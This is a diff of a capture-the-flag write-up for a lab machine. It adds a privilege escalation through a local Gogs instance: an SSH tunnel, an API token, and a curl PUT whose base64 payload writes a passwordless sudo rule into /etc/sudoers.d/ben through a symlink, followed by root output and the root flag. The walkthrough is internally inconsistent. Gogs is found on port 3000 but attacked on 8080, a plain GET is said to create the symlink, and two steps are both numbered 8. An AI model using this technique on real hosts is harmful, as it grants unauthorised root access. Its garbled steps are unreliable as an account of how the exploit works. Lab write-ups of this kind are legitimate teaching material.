@@ -301,33 +301,58 @@ ben@silentium:~$ cat user.txt
 ### Discovering a Local Service
 
 During enumeration, we check for listening ports on localhost.
+```bash
+ben@silentium:~$ ss -tulpn
+```
+
+We see ports `3000` and `8080` listening on `127.0.0.1`. A quick `curl localhost:3000` reveals **Gogs**, a self-hosted Git service.
+
 
 ![[Pasted image 20260817213225.png]]
 
+### Gogs Registration & Token Generation
 
+We navigate to `http://127.0.0.1:8080` in a browser (using an SSH tunnel `ssh -L 8080:localhost:8080 ben@silentium.htb`) and create a new account.
 
 
 ![[Pasted image 20260817213306.png]]
 
 
+After logging in, we navigate to **Settings → Applications** and generate a Personal Access Token.
+
+**Token generated:** `4c883a228d6ef8f0449792b08e65ec1a3dbb725a`
 
 ![[Pasted image 20260817222245.png]]
 
+### Exploiting Gogs Repository API
 
+We create a new repository named `exploit` and use the Gogs API to upload a malicious symlink file.
 
+**Goal:** Create a symlink to `/etc/sudoers.d/ben` and overwrite it with our own sudo rules.
 
-4c883a228d6ef8f0449792b08e65ec1a3dbb725a
+#### 1. Get the current file SHA and contents
+
+First, we check if the file exists (it doesn't yet, so we skip to creation).
+
+#### 2. Create a malicious symlink
+
+We create a Git commit that adds a symlink.
+
+```bash
+curl -H "Authorization: token 4c883a228d6ef8f0449792b08e65ec1a3dbb725a" \
+     "http://127.0.0.1:8080/api/v1/repos/thunder/exploit/contents/malicious_link"
+```
 
 
 ![[Pasted image 20260817222318.png]]
 
 
-af61034fa349f6a1038e549e9893721da4b984dd
+**Output:** The API returns `{"type":"symlink","target":"/etc/sudoers.d/ben"}`. This confirms the symlink exists and targets the sudoers file.
 
+#### 3. Push the new content (Base64 encoded)
 
-![[Pasted image 20260817222341.png]]
-
-
+We use a `PUT` request to update the file, injecting our sudo rule (`ben ALL=(ALL) NOPASSWD: ALL`).
+```bash
 curl -X PUT "http://127.0.0.1:8080/api/v1/repos/thunder/exploit/contents/malicious_link" \
      -H "Authorization: token 4c883a228d6ef8f0449792b08e65ec1a3dbb725a" \
      -H "Content-Type: application/json" \
@@ -336,14 +361,52 @@ curl -X PUT "http://127.0.0.1:8080/api/v1/repos/thunder/exploit/contents/malicio
          "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==",
          "sha": "af61034fa349f6a1038e549e9893721da4b984dd"
      }'
+```
 
 
+![[Pasted image 20260817222341.png]]
+
+**What Happened:** The Gogs API received our update. Because of the symlink, when Gogs creates the file (via the Git hook or file processing), it actually writes the content to the _target_ of the symlink, which is `/etc/sudoers.d/ben`.
+
+### Verifying Privilege Escalation
+
+Checking the sudoers file confirms our persistence.
+```bash
+ben@silentium:~$ sudo id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
 ![[Pasted image 20260817222406.png]]
 
+**Result:** We now have passwordless sudo access!
+
+
+
+---
+
+## Step 8: Machine Owned
+
+```bash
+ben@silentium:~$ sudo cat /root/root.txt
+2ac6a9b7a8d9626754a1ed529a6cc0a0
+```
 
 
 ![[Pasted image 20260817222424.png]]
 
 
+The machine is fully owned! We successfully compromised the target by chaining a web API information leak, Flowise RCE, and a Gogs symlink privilege escalation.
+
+
+
+---
+
+## Step 8: Machine Solved
+
+
+![[Pasted image 20260818220411.png]]
+
+
+----
+----
 
